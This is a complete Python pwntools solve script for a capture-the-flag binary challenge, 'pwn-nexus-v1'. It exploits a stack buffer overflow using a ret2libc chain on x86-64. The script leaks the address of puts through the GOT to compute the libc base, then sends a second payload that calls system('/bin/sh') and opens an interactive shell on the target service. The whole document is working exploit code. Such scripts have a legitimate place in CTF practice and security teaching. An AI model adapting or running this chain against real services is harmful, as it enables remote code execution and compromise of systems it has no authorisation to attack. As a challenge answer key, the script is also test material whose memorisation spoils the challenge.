#!/usr/bin/env python3
"""
Solve script — pwn-nexus-v1 (ret2libc, x86-64)
Run after patching binary with pwninit:
  pwninit --bin nexus --libc libc.so.6
"""
from pwn import *

HOST = "localhost"
PORT = 9999

elf  = ELF("./nexus")
libc = ELF("./libc.so.6")

# Gadgets (no PIE so addresses are static)
pop_rdi = next(elf.search(asm("pop rdi; ret", arch="amd64")))
ret_pad = next(elf.search(asm("ret",          arch="amd64")))  # stack alignment

OFFSET = 88  # buf[80] + saved_rbp[8]


def leak_libc(p):
    payload  = b"A" * OFFSET
    payload += p64(pop_rdi)
    payload += p64(elf.got["puts"])     # arg: puts@GOT
    payload += p64(elf.plt["puts"])     # call puts(puts@GOT) → leaks libc addr
    payload += p64(elf.sym["main"])     # return to main for stage 2

    p.sendafter(b"credentials: ", payload)
    p.recvuntil(b"Access denied.\n")
    leak = u64(p.recv(6).ljust(8, b"\x00"))
    log.success(f"Leaked puts @ {hex(leak)}")

    libc.address = leak - libc.sym["puts"]
    log.success(f"libc base   @ {hex(libc.address)}")


def get_shell(p):
    payload  = b"A" * OFFSET
    payload += p64(ret_pad)                              # 16-byte align for system()
    payload += p64(pop_rdi)
    payload += p64(next(libc.search(b"/bin/sh\x00")))   # arg: /bin/sh
    payload += p64(libc.sym["system"])

    p.sendafter(b"credentials: ", payload)


def main():
    context.arch = "amd64"
    p = remote(HOST, PORT)

    leak_libc(p)
    get_shell(p)

    p.interactive()


if __name__ == "__main__":
    main()
